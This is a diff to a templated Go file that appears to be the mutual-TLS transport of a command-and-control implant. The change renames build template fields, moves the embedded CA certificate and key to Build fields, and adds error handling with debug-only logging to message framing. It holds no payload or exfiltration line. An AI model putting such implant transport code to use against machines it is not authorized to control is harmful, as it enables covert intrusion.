@@ -18,7 +18,7 @@ package mtls
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.MTLSc2Enabled}}
+// {{if .Config.IncludeMTLS}}
 
 import (
 	"bytes"
@@ -46,10 +46,10 @@ var (
 	PingInterval = 2 * time.Minute
 
 	// caCertPEM - PEM encoded CA certificate
-	caCertPEM = `{{.Config.MtlsCACert}}`
+	caCertPEM = `{{.Build.MtlsCACert}}`
 
-	keyPEM  = `{{.Config.MtlsKey}}`
-	certPEM = `{{.Config.MtlsCert}}`
+	keyPEM  = `{{.Build.MtlsKey}}`
+	certPEM = `{{.Build.MtlsCert}}`
 )
 
 // WriteEnvelope - Writes a message to the TLS socket using length prefix framing
@@ -65,8 +65,18 @@ func WriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	}
 	dataLengthBuf := new(bytes.Buffer)
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
-	connection.Write(dataLengthBuf.Bytes())
-	connection.Write(data)
+	if _, werr := connection.Write(dataLengthBuf.Bytes()); werr != nil {
+		// {{if .Config.Debug}}
+		log.Print("Error writing data length: ", werr)
+		// {{end}}
+		return werr
+	}
+	if _, werr := connection.Write(data); werr != nil {
+		// {{if .Config.Debug}}
+		log.Print("Error writing data: ", werr)
+		// {{end}}
+		return werr
+	}
 	return nil
 }
 
@@ -176,4 +186,4 @@ func getTLSConfig() *tls.Config {
 	return tlsConfig
 }
 
-// {{end}} -MTLSc2Enabled
+// {{end}} -IncludeMTLS
